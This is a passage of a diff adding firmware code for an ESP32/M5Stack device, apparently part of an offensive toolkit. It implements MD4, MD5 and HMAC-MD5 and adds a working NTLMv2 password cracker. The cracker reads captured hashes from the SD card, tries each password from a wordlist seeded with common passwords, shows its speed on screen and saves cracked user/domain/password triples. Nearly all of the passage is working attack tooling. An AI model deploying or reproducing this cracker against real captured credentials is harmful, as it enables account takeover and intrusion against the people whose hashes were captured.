+  ROUND3(a,b,c,d, 3, 3);  ROUND3(d,a,b,c,11, 9);  ROUND3(c,d,a,b, 7,11);  ROUND3(b,c,d,a,15,15);
+
+  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d;
+}
+
+void MD4_Init(MD4_CTX *ctx) {
+  ctx->count[0] = ctx->count[1] = 0;
+  ctx->state[0] = 0x67452301;
+  ctx->state[1] = 0xefcdab89;
+  ctx->state[2] = 0x98badcfe;
+  ctx->state[3] = 0x10325476;
+}
+
+void MD4_Update(MD4_CTX *ctx, const uint8_t *input, size_t len) {
+  size_t i, idx, partLen;
+  idx = (ctx->count[0] >> 3) & 0x3F;
+  if ((ctx->count[0] += ((uint32_t)len << 3)) < ((uint32_t)len << 3))
+    ctx->count[1]++;
+  ctx->count[1] += ((uint32_t)len >> 29);
+  partLen = 64 - idx;
+  if (len >= partLen) {
+    memcpy(&ctx->buffer[idx], input, partLen);
+    MD4_Transform(ctx->state, ctx->buffer);
+    for (i = partLen; i + 63 < len; i += 64)
+      MD4_Transform(ctx->state, &input[i]);
+    idx = 0;
+  } else i = 0;
+  memcpy(&ctx->buffer[idx], &input[i], len - i);
+}
+
+void MD4_Final(uint8_t digest[16], MD4_CTX *ctx) {
+  uint8_t bits[8];
+  MD4_Encode(bits, ctx->count, 8);
+  size_t idx = (ctx->count[0] >> 3) & 0x3f;
+  size_t padLen = (idx < 56) ? (56 - idx) : (120 - idx);
+  static uint8_t PADDING[64] = { 0x80 };
+  MD4_Update(ctx, PADDING, padLen);
+  MD4_Update(ctx, bits, 8);
+  MD4_Encode(digest, ctx->state, 16);
+} 
+
+// =======================
+// NT hash (UTF16-LE + MD4)
+// =======================
+void ntlmHash(const char *password, uint8_t out[16]) {
+  size_t len = strlen(password);
+  size_t ulen = len * 2;
+  uint8_t buf[ulen];  // stack allocation
+  for (size_t i=0; i<len; i++) {
+    buf[2*i]   = (uint8_t)password[i];
+    buf[2*i+1] = 0x00;
+  }
+  MD4_CTX ctx;
+  MD4_Init(&ctx);
+  MD4_Update(&ctx, buf, ulen);
+  MD4_Final(out, &ctx);
+}
+
+
+/* =========================
+ *  MD5 ultra-léger (ESP32)
+ * ========================= */
+
+inline uint32_t ROTL32(uint32_t x, uint8_t n) { return (x << n) | (x >> (32 - n)); }
+
+#define Ff(x,y,z) ((x & y) | (~x & z))
+#define Gg(x,y,z) ((x & z) | (y & ~z))
+#define Hh(x,y,z) (x ^ y ^ z)
+#define Ii(x,y,z) (y ^ (x | ~z))
+
+#define FF(a,b,c,d,x,s,ac) { a += Ff(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
+#define GG(a,b,c,d,x,s,ac) { a += Gg(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
+#define HH(a,b,c,d,x,s,ac) { a += Hh(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
+#define II(a,b,c,d,x,s,ac) { a += Ii(b,c,d) + (x) + (uint32_t)(ac); a = ROTL32(a, s); a += b; }
+
+void md5u_init(MD5U_CTX *ctx) {
+  ctx->count[0] = ctx->count[1] = 0;
+  ctx->state[0] = 0x67452301;
+  ctx->state[1] = 0xEFCDAB89;
+  ctx->state[2] = 0x98BADCFE;
+  ctx->state[3] = 0x10325476;
+}
+
+void md5u_encode(uint8_t *out, const uint32_t *in, size_t len) {
+  for (size_t i = 0, j = 0; j < len; i++, j += 4) {
+    out[j]   = (uint8_t)( in[i]        & 0xFF);
+    out[j+1] = (uint8_t)((in[i] >>  8) & 0xFF);
+    out[j+2] = (uint8_t)((in[i] >> 16) & 0xFF);
+    out[j+3] = (uint8_t)((in[i] >> 24) & 0xFF);
+  }
+}
+
+void md5u_decode(uint32_t *out, const uint8_t *in, size_t len) {
+  for (size_t i = 0, j = 0; j < len; i++, j += 4) {
+    out[i] =  (uint32_t)in[j]
+            | ((uint32_t)in[j+1] << 8)
+            | ((uint32_t)in[j+2] << 16)
+            | ((uint32_t)in[j+3] << 24);
+  }
+}
+
+IRAM_ATTR void md5u_transform(uint32_t state[4], const uint8_t block[64]) {
+  uint32_t a = state[0], b = state[1], c = state[2], d = state[3], x[16];
+  md5u_decode(x, block, 64);
+
+  // Round 1
+  FF(a,b,c,d, x[ 0],  7, 0xd76aa478); FF(d,a,b,c, x[ 1], 12, 0xe8c7b756);
+  FF(c,d,a,b, x[ 2], 17, 0x242070db); FF(b,c,d,a, x[ 3], 22, 0xc1bdceee);
+  FF(a,b,c,d, x[ 4],  7, 0xf57c0faf); FF(d,a,b,c, x[ 5], 12, 0x4787c62a);
+  FF(c,d,a,b, x[ 6], 17, 0xa8304613); FF(b,c,d,a, x[ 7], 22, 0xfd469501);
+  FF(a,b,c,d, x[ 8],  7, 0x698098d8); FF(d,a,b,c, x[ 9], 12, 0x8b44f7af);
+  FF(c,d,a,b, x[10], 17, 0xffff5bb1); FF(b,c,d,a, x[11], 22, 0x895cd7be);
+  FF(a,b,c,d, x[12],  7, 0x6b901122); FF(d,a,b,c, x[13], 12, 0xfd987193);
+  FF(c,d,a,b, x[14], 17, 0xa679438e); FF(b,c,d,a, x[15], 22, 0x49b40821);
+
+  // Round 2
+  GG(a,b,c,d, x[ 1],  5, 0xf61e2562); GG(d,a,b,c, x[ 6],  9, 0xc040b340);
+  GG(c,d,a,b, x[11], 14, 0x265e5a51); GG(b,c,d,a, x[ 0], 20, 0xe9b6c7aa);
+  GG(a,b,c,d, x[ 5],  5, 0xd62f105d); GG(d,a,b,c, x[10], 9, 0x02441453);
+  GG(c,d,a,b, x[15], 14, 0xd8a1e681); GG(b,c,d,a, x[ 4], 20, 0xe7d3fbc8);
+  GG(a,b,c,d, x[ 9],  5, 0x21e1cde6); GG(d,a,b,c, x[14], 9, 0xc33707d6);
+  GG(c,d,a,b, x[ 3], 14, 0xf4d50d87); GG(b,c,d,a, x[ 8], 20, 0x455a14ed);
+  GG(a,b,c,d, x[13],  5, 0xa9e3e905); GG(d,a,b,c, x[ 2],  9, 0xfcefa3f8);
+  GG(c,d,a,b, x[ 7], 14, 0x676f02d9); GG(b,c,d,a, x[12], 20, 0x8d2a4c8a);
+
+  // Round 3
+  HH(a,b,c,d, x[ 5],  4, 0xfffa3942); HH(d,a,b,c, x[ 8], 11, 0x8771f681);
+  HH(c,d,a,b, x[11], 16, 0x6d9d6122); HH(b,c,d,a, x[14], 23, 0xfde5380c);
+  HH(a,b,c,d, x[ 1],  4, 0xa4beea44); HH(d,a,b,c, x[ 4], 11, 0x4bdecfa9);
+  HH(c,d,a,b, x[ 7], 16, 0xf6bb4b60); HH(b,c,d,a, x[10], 23, 0xbebfbc70);
+  HH(a,b,c,d, x[13],  4, 0x289b7ec6); HH(d,a,b,c, x[ 0], 11, 0xeaa127fa);
+  HH(c,d,a,b, x[ 3], 16, 0xd4ef3085); HH(b,c,d,a, x[ 6], 23, 0x04881d05);
+  HH(a,b,c,d, x[ 9],  4, 0xd9d4d039); HH(d,a,b,c, x[12], 11, 0xe6db99e5);
+  HH(c,d,a,b, x[15], 16, 0x1fa27cf8); HH(b,c,d,a, x[ 2], 23, 0xc4ac5665);
+
+  // Round 4
+  II(a,b,c,d, x[ 0],  6, 0xf4292244); II(d,a,b,c, x[ 7], 10, 0x432aff97);
+  II(c,d,a,b, x[14], 15, 0xab9423a7); II(b,c,d,a, x[ 5], 21, 0xfc93a039);
+  II(a,b,c,d, x[12],  6, 0x655b59c3); II(d,a,b,c, x[ 3], 10, 0x8f0ccc92);
+  II(c,d,a,b, x[10], 15, 0xffeff47d); II(b,c,d,a, x[ 1], 21, 0x85845dd1);
+  II(a,b,c,d, x[ 8],  6, 0x6fa87e4f); II(d,a,b,c, x[15], 10, 0xfe2ce6e0);
+  II(c,d,a,b, x[ 6], 15, 0xa3014314); II(b,c,d,a, x[13], 21, 0x4e0811a1);
+  II(a,b,c,d, x[ 4],  6, 0xf7537e82); II(d,a,b,c, x[11], 10, 0xbd3af235);
+  II(c,d,a,b, x[ 2], 15, 0x2ad7d2bb); II(b,c,d,a, x[ 9], 21, 0xeb86d391);
+
+  state[0] += a; state[1] += b; state[2] += c; state[3] += d;
+}
+
+void md5u_update(MD5U_CTX *ctx, const uint8_t *input, size_t len) {
+  uint32_t i = 0, idx = (ctx->count[0] >> 3) & 0x3F;
+  ctx->count[0] += (uint32_t)len << 3;
+  if (ctx->count[0] < ((uint32_t)len << 3)) ctx->count[1]++;
+  ctx->count[1] += (uint32_t)len >> 29;
+
+  uint32_t partLen = 64 - idx;
+  if (len >= partLen) {
+    memcpy(&ctx->buffer[idx], input, partLen);
+    md5u_transform(ctx->state, ctx->buffer);
+    for (i = partLen; i + 63 < len; i += 64) md5u_transform(ctx->state, &input[i]);
+    idx = 0;
+  } else {
+    i = 0;
+  }
+  memcpy(&ctx->buffer[idx], &input[i], len - i);
+}
+
+void md5u_final(uint8_t digest[16], MD5U_CTX *ctx) {
+  static const uint8_t PADDING[64] = { 0x80 };
+  uint8_t bits[8];
+  md5u_encode(bits, ctx->count, 8);
+
+  uint32_t idx = (ctx->count[0] >> 3) & 0x3F;
+  uint32_t padLen = (idx < 56) ? (56 - idx) : (120 - idx);
+  md5u_update(ctx, PADDING, padLen);
+  md5u_update(ctx, bits, 8);
+  md5u_encode(digest, ctx->state, 16);
+}
+
+/* =========================
+ *  HMAC-MD5 optimisé
+ * ========================= */
+
+bool fastHMAC_MD5(const uint8_t *key, size_t keylen,
+                  const uint8_t *msg, size_t msglen,
+                  uint8_t out[16]) {
+  uint8_t k_ipad[64], k_opad[64];
+  uint8_t khash[16];
+
+  // 1) Si key > 64, key = MD5(key)
+  const uint8_t* k = key;
+  size_t klen = keylen;
+  if (keylen > 64) {
+    MD5U_CTX ck; md5u_init(&ck);
+    md5u_update(&ck, key, keylen);
+    md5u_final(khash, &ck);
+    k = khash; klen = 16;
+  }
+
+  // 2) Prépare ipad/opad (64 octets fixes)
+  memset(k_ipad, 0x36, 64);
+  memset(k_opad, 0x5c, 64);
+  for (size_t i=0; i<klen; ++i) {
+    k_ipad[i] ^= k[i];
+    k_opad[i] ^= k[i];
+  }
+
+  // 3) inner = MD5( (k^ipad) || msg )
+  uint8_t inner[16];
+  MD5U_CTX c;
+  md5u_init(&c);
+  md5u_update(&c, k_ipad, 64);
+  md5u_update(&c, msg, msglen);
+  md5u_final(inner, &c);
+
+  // 4) outer = MD5( (k^opad) || inner )
+  md5u_init(&c);
+  md5u_update(&c, k_opad, 64);
+  md5u_update(&c, inner, 16);
+  md5u_final(out, &c);
+
+  return true;
+}
+
+// =======================
+// Utils
+// =======================
+String toUpperCase(const String &s) { String out = s; out.toUpperCase(); return out; }
+
+uint8_t hx(char c){ if(c>='0'&&c<='9')return c-'0'; c|=0x20; return 10+(c-'a'); }
+void hexToBytes(const String &hex, uint8_t *out, size_t len){
+  for(size_t i=0;i<len;i++) out[i]=(hx(hex[2*i])<<4)|hx(hex[2*i+1]);
+}
+
+bool hmacMD5(const uint8_t *key, size_t keylen,
+             const uint8_t *msg, size_t msglen,
+             uint8_t out[16]) {
+  const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
+  if(!info) return false;
+  int r = mbedtls_md_hmac(info, key, keylen, msg, msglen, out);
+  return (r==0);
+}
+
+void toUTF16LE(const String &s, uint8_t **buf, size_t *outLen){
+  *outLen = s.length()*2;
+  *buf = (uint8_t*)malloc(*outLen);
+  for(size_t i=0;i<s.length();++i){
+    (*buf)[2*i]=(uint8_t)s[i]; (*buf)[2*i+1]=0x00;
+  }
+}
+
+void dumpHex(const char *label, const uint8_t *buf, size_t len) {
+  Serial.print(label);
+  for(size_t i=0;i<len;i++) {
+    if (buf[i] < 0x10) Serial.print("0");
+    Serial.print(buf[i], HEX);
+  }
+  Serial.println();
+}
+
+// =======================
+// Feedback NTLM structuré
+// =======================
+void drawNTLMInitUser(const String &user) {
+  // Efface tout l'écran
+  M5.Display.fillScreen(TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(0, 20);
+
+  // Affiche le nom utilisateur en cours
+  String shortUser = user;
+  if (shortUser.length() > 36) {
+    shortUser = shortUser.substring(0, 33) + "...";
+  }
+  M5.Display.println("User: " + shortUser);
+
+  // Réserve la ligne suivante pour compteur
+  M5.Display.setCursor(0, 40);
+  M5.Display.println("Tried: 0");
+}
+
+void drawNTLMTries(uint32_t tried) {
+  // Met à jour uniquement la ligne "Tried"
+  M5.Display.fillRect(0, 40, 240, 12, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(0, 40);
+  M5.Display.print("Tried: ");
+  M5.Display.println(tried);
+}
+
+void drawNTLMResult(const String &msg, bool success = false) {
+  // Résultat final pour cet utilisateur
+  int y = 75; // ↓ descendu pour ne pas chevaucher le H/s
+
+  M5.Display.fillRect(0, y, 240, 12, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
+  M5.Display.setCursor(0, y);
+
+  String shortMsg = msg;
+  M5.Display.println(shortMsg);
+
+  Serial.println(msg);
+}
+
+
+
+void ensureFilesExist() {
+  if (!SD.exists("/evil")) {
+    SD.mkdir("/evil");
+    Serial.println("[INFO] Created /evil directory");
+  }
+
+  if (!SD.exists("/evil/NTLM/ntlm_hashes.txt")) {
+    File nf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_WRITE);
+    if (nf) {
+      Serial.println("[INFO] Created empty /evil/NTLM/ntlm_hashes.txt");
+      nf.close();
+    } else {
+      Serial.println("[ERROR] Failed to create /evil/NTLM/ntlm_hashes.txt");
+    }
+  }
+
+  if (!SD.exists("/evil/NTLM/ntlm_wordlist.txt")) {
+    File wf = SD.open("/evil/NTLM/ntlm_wordlist.txt", FILE_WRITE);
+    if (wf) {
+      wf.println("admin");
+      wf.println("root");
+      wf.println("123456");
+      wf.println("qwerty");
+      wf.println("secret");
+      wf.println("password");
+      wf.println("qwerty123");
+      wf.println("iloveyou");
+      wf.println("654321");
+      wf.println("a123456");
+      wf.close();
+      Serial.println("[INFO] Created default /evil/NTLM/ntlm_wordlist.txt");
+    } else {
+      Serial.println("[ERROR] Failed to create /evil/NTLM/ntlm_wordlist.txt");
+    }
+  }
+}
+
+void drawProgressBar(uint32_t current, uint32_t total) {
+  if (total == 0) return;
+  int barWidth = 240;   // largeur max de la barre
+  int barHeight = 8;    // hauteur (fine pour économiser la place)
+  int x = 0;           // position X sur l’écran
+  int y = 120;          // position Y bas écran
+  int filled = (int)((current * barWidth) / total);
+
+  // fond noir
+  M5.Display.fillRect(x, y, barWidth, barHeight, TFT_BLACK);
+
+  // partie remplie en vert
+  M5.Display.fillRect(x, y, filled, barHeight, TFT_GREEN);
+  M5.Display.drawRect(x, y, barWidth, barHeight, TFT_WHITE);
+}
+
+void drawHashrate(uint32_t hps) {
+  // Met à jour uniquement la ligne Hash/s
+  M5.Display.fillRect(0, 55, 240, 12, TFT_BLACK);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextFont(1);
+  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+  M5.Display.setCursor(0, 55);
+  M5.Display.print("Speed: ");
+  M5.Display.print(hps);
+  M5.Display.println(" H/s");
+}
+
+// =======================
+// Crack NTLMv2
+// =======================
+void crackNTLMv2() {
+  ensureFilesExist();
+
+  File hf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_READ);
+  if (!hf) {
+    Serial.println("[ERROR] Cannot open /evil/NTLM/ntlm_hashes.txt");
+    waitAndReturnToMenu("Back To Main Menu");
+    return;
+  }
+
+  if (hf.size() == 0) {
+    Serial.println("[WARN] /evil/NTLM/ntlm_hashes.txt is empty!");
+    hf.close();
+
+    M5.Display.fillScreen(TFT_BLACK);
+    M5.Display.setCursor(20, 50);
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+    M5.Display.println("ntlm_hashes.txt is empty!");
+    delay(2000);
+
+    waitAndReturnToMenu("Back To Main Menu");
+    return;
+  }
+  bool stopRequested = false;
+  while (hf.available() && !stopRequested) {
+    if (isBackspacePressed()) {
+      stopRequested = true;
+      break;
+    }
+    String line = hf.readStringUntil('\n');
+    line.trim();
+    if (line.length() < 10 || line.startsWith("-")) continue;
+
+    Serial.println("=====================================");
+    Serial.println("[INFO] Testing hash line: " + line);
+
+    // Parse NTLMv2 line: user::domain:challenge:ntproof:blob
+    int idx1 = line.indexOf("::");
+    int idx2 = line.indexOf(":", idx1+2);
+    int idx3 = line.indexOf(":", idx2+1);
+    int idx4 = line.indexOf(":", idx3+1);
+    if (idx1 < 0 || idx2 < 0 || idx3 < 0 || idx4 < 0) {
+      Serial.println("[WARN] Invalid line format, skipping.");
+      continue;
+    }
+
+    String user     = line.substring(0, idx1);
+    String domain   = line.substring(idx1+2, idx2);
+    String challHex = line.substring(idx2+1, idx3);
+    String ntProofHex = line.substring(idx3+1, idx4);
+    String blobHex  = line.substring(idx4+1);
+
+    drawNTLMInitUser(user);
+
+    uint8_t challenge[8];  hexToBytes(challHex, challenge, 8);
+    uint8_t ntProof[16];   hexToBytes(ntProofHex, ntProof, 16);
+
+    int blobLen = blobHex.length()/2;
+    if (blobLen <= 0) { Serial.println("[WARN] Invalid blob, skipping."); continue; }
+    uint8_t *blob = (uint8_t*)malloc(blobLen);
+    hexToBytes(blobHex, blob, blobLen);
+
+    // Pré-construire SC||Blob
+    size_t msgLen = 8 + (size_t)blobLen;
+    uint8_t *msg = (uint8_t*)malloc(msgLen);
+    memcpy(msg, challenge, 8);
+    memcpy(msg+8, blob, blobLen);
+
+    // Pré-construire UTF16LE(UPPER(user)+domain) — garder le '$' s’il existe
+    String upUser = toUpperCase(user);
+    uint8_t *u16, *d16; size_t u16len, d16len;
+    toUTF16LE(upUser, &u16, &u16len);
+    toUTF16LE(domain, &d16, &d16len);
+    uint8_t *idbuf = (uint8_t*)malloc(u16len + d16len);
+    memcpy(idbuf, u16, u16len);
+    memcpy(idbuf + u16len, d16, d16len);
+    free(u16); free(d16);
+
+    // Ouvrir la wordlist
+    File wf = SD.open("/evil/NTLM/ntlm_wordlist.txt", FILE_READ);
+    if (!wf) {
+      Serial.println("[ERROR] No /evil/NTLM/ntlm_wordlist.txt found");
+      free(blob); free(msg); free(idbuf);
+      continue;
+    }
+    const uint32_t totalBytes = wf.size();
+    
+    bool found = false;
+    uint32_t tried = 0;
+
+    uint32_t lastUpdateTried = 0;
+    uint32_t lastUpdateTime  = millis();
+
+    String pwd;
+    pwd.reserve(64);
+    
+    while (wf.available() && !found && !stopRequested) {
+      if (isBackspacePressed()) {
+        stopRequested = true;
+        break;
+      }
+      String pwd = wf.readStringUntil('\n');
+      pwd.trim();
+      if (pwd.length() == 0) continue;          // skip lignes vides
+      if (pwd[0] == '#' || pwd[0] == ';') continue; // skip commentaires
+
+      uint8_t nthash[16];
+      ntlmHash(pwd.c_str(), nthash);
+
+      // v2Key = HMAC_MD5(NT_hash, UTF16LE(UPPER(user)+domain))
+      uint8_t v2key[16];
+      fastHMAC_MD5(nthash, 16, idbuf, u16len + d16len, v2key);
+      
+      // resp = HMAC_MD5(v2key, challenge||blob)
+      uint8_t resp[16];
+      fastHMAC_MD5(v2key, 16, msg, msgLen, resp);
+
+
+      tried++;
+      if ((tried % 1000) == 0) {
+        drawNTLMTries(tried);
+        uint32_t processedBytes = wf.position();
+        drawProgressBar(processedBytes, totalBytes);    
+        uint32_t now = millis();
+        uint32_t elapsed = now - lastUpdateTime;
+        if (elapsed > 0) {
+          uint32_t hashes = tried - lastUpdateTried;
+          uint32_t hps = (hashes * 1000UL) / elapsed; // H/s
+          drawHashrate(hps);
+          lastUpdateTried = tried;
+          lastUpdateTime  = now;
+        }
+      }
+
+
+      if (memcmp(resp, ntProof, 16) == 0) {
+        String foundMsg = "[SUCCESS] \nFOUND password for :\n" + user + ":" + pwd;
+        Serial.println(foundMsg);
+
+        // --- FEEDBACK : résultat trouvé ---
+        drawNTLMResult(foundMsg, true);
+
+        // Sauvegarde dans le fichier
+        File foundFile = SD.open("/evil/NTLM/ntlm_found.txt", FILE_APPEND);
+        if (foundFile) {
+          foundFile.print(user);
+          foundFile.print("::");
+          foundFile.print(domain);
+          foundFile.print(": ");
+          foundFile.println(pwd);
+          foundFile.close();
+        } else {
+          Serial.println("[ERROR] Failed to open /evil/NTLM/ntlm_found.txt for writing.");
+        }
+        delay(2000);
+        found = true;
+        break;
+      }
+    }
+    if (wf.position() == totalBytes) {
+      drawProgressBar(totalBytes, totalBytes);
+    }
+    wf.close();
+
+    if (!found) {
+      Serial.print("[RESULT] No match in wordlist for user ");
+      Serial.println(user);
+
+      // --- FEEDBACK : résultat FAIL ---
+      drawNTLMResult("[FAIL] \n No match for :\n " + user, false);
+    }
+
+    free(idbuf);
+    free(msg);
+    free(blob);
+
+    delay(1000);
+  }
+  hf.close();
+  waitAndReturnToMenu("Back To Main Menu");
+}
+
+
+
+
+
+bool cleanDuplicatesUserDomain(const char *filePath) {
+  File f = SD.open(filePath, FILE_READ);
+  if (!f) return false;
+
+  std::set<String> seenUsers;    // stocke les couples "user::domain"
+  std::vector<String> cleaned;   // stocke les lignes retenues
+
+  while (f.available()) {
+    String line = f.readStringUntil('\n');
+    line.trim();
+    if (line.length() < 10 || line.startsWith("-")) continue;
+
+    int idx1 = line.indexOf("::");
+    int idx2 = line.indexOf(":", idx1 + 2);
+    if (idx1 < 0 || idx2 < 0) continue;
+
+    String user   = line.substring(0, idx1);
+    String domain = line.substring(idx1 + 2, idx2);
+    String key = user + "::" + domain;
+
+    if (seenUsers.find(key) == seenUsers.end()) {
+      seenUsers.insert(key);
+      cleaned.push_back(line);
+    }
+  }
+  f.close();
+
+  File nf = SD.open(filePath, FILE_WRITE);
+  if (!nf) return false;
+  for (auto &entry : cleaned) {
+    nf.println(entry);
+  }
+  nf.close();
+
+  return true;
+}
+
+
+void CleanNTLMHashes() {
+  // Demander confirmation avec ton popup existant
+  if (!confirmPopup("Clean duplicates ?")) {
+    Serial.println("[INFO] User cancelled duplicate cleanup.");
+    waitAndReturnToMenu("Aborted.");
+    return;
+  }
+
+  Serial.println("[INFO] Starting cleanup of /evil/NTLM/ntlm_hashes.txt ...");
+
+  if (!SD.exists("/evil/NTLM/ntlm_hashes.txt")) {
+    Serial.println("[WARN] File not found: /evil/NTLM/ntlm_hashes.txt");
+    return;
+  }
+    M5.Display.fillScreen(TFT_BLACK);
+    M5.Display.setCursor(0, 60);
+    M5.Display.setTextSize(2.5);
+    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+    M5.Display.println("Please wait !");
+    M5.Display.println("Cleaning up..");
+  if (cleanDuplicatesUserDomain("/evil/NTLM/ntlm_hashes.txt")) {
+    Serial.println("[INFO] Duplicate cleanup completed successfully.");
+    // Affichage écran feedback
+    M5.Display.fillScreen(TFT_BLACK);
+    M5.Display.setCursor(0, 60);
+    M5.Display.setTextSize(2.5);
+    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+    M5.Display.println("Cleanup done!");
+    delay(1500);
+  } else {
+    Serial.println("[ERROR] Duplicate cleanup failed.");
+    M5.Display.fillScreen(TFT_BLACK);
+    M5.Display.setCursor(0, 60);
+    M5.Display.setTextSize(2.5);
+    M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+    M5.Display.println("Cleanup failed!");
+    delay(1500);
+  }
+  waitAndReturnToMenu("Back To Main Menu");
+
+}
